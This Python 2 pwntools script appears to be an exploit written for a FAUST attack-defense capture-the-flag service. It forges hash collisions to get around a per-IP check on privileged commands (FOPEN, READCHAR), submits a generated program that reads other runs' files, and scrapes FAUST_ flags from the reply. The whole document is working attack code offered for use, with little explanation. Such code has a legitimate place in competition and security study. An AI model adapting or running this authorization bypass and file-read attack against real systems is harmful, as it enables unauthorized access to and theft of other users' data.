#!/usr/bin/python2

from pwn import *
import sys


def getHash(s):
	curx = 42
	cury = 43
	for c in s:
		curx = curx * 14323 + ord(c) % 16
		cury = cury * 53731 + ord(c) // 16;
		curx %= (2**16)
		cury %= (2**16)
	return (curx + cury) % 256	
	
def getHashArray(s):
	curx = 42
	cury = 43
	for c in s:
		curx = curx * 14323 + c % 16
		cury = cury * 53731 + c // 16;
		curx %= (2**16)
		cury %= (2**16)
	return (curx, cury)

def getHashComplete(curx, cury, ip):
	for c in ip:
		curx = curx * 14323 + ord(c) % 16
		cury = cury * 53731 + ord(c) // 16;
		curx %= (2**16)
		cury %= (2**16)
	return (curx + cury) % 256	

def getHashCollision(targetID, ip):
	curx = 42
	cury = 43;
	chars = [ord('A')] * 4
	while True:
		part1 = getHashArray(chars)
		part2 = getHashComplete(part1[0], part1[1], ip)
		if part2 == targetID:
			return "".join(map(chr, chars))
		chars[-1] += 1
		k = len(chars)-1
		while k > 0 and chars[k] > ord('Z'):
			chars[k] = ord('A')
			k -= 1
			chars[k] += 1
		if chars[0] > ord('Z'):
			return "Failed"

collissions = dict()

def genProg(l, ip):
	global collissions
	res = [
		"DECLARE $a",
		"DECLARE $b",
		]
	x = 0
	if ip not in collissions:
		collissions[ip] = dict()
		collissions[ip]["FOPEN"] = getHashCollision(getHash("FOPEN" + ip), ip)
		collissions[ip]["READCHAR"] = getHashCollision(getHash("READCHAR" + ip), ip)

	for f in l:
		res += ["CALL STRNCMP \"hallo\" \"r\" 1"]
		res += ["CALL %s \"runs/%s\" -> $a" % (collissions[ip]["FOPEN"], f)]
		res += ["LABEL l" + str(x)]
		res += ["CALL %s $a -> $b" % collissions[ip]["READCHAR"]]
		res += ["IF $b G 200 GOTO lend" + str(x)]
		res += ["CALL WRITECHAR $b"]
		res += ["GOTO l" + str(x)]
		res += ["LABEL lend" + str(x)]
		x += 1
	return "\n".join(res)

r = remote("vulnbox-test.faust.ninja", 64646)
r.send("3\n")
listFiles = r.recvall().strip()
r.close()
q = "SUCC: Runs in the last 30 min:"
f = listFiles.find(q)
if f == -1:
	print("Failed getting the list: ")
	print(listFiles)
	sys.exit(1)
f += len(q)
files = [x for x in listFiles[f:].strip().split(" ") if len(x) > 0]

if len(files) == 0:
	print("No recent files found")
	sys.exit(1)

print("%d Files found: %s" % (len(files), str(files)))

p = genProg(files, "10.110.110.200")
r = remote("vulnbox-test.faust.ninja", 64646)
r.send("1 " + str(len(p)) + "\n" + p)
answer = r.recvall()
r.close()
q = "Submission stored with id "
a1 = answer.find(q)
if a1 == -1:
	print("Failed")
	print(answer)
	sys.exit(1)
a1 += len(q)
q2 = " and pwd "
a2 = answer.find(q2, a1)

idstr = answer[a1:a2]
pwd = answer[a2 + len(q2):].strip()

# now get the result
#r = remote("vulnbox-test.faust.ninja", 64646)
#r.send("2 " + idstr + " " + pwd + "\n")
#answer = r.recvall()
#r.close()
# extract flags
s = -1
while True:
	s = answer.find("FAUST_", s+1)
	if s == -1:
		break
	print(answer[s:s+6+32])
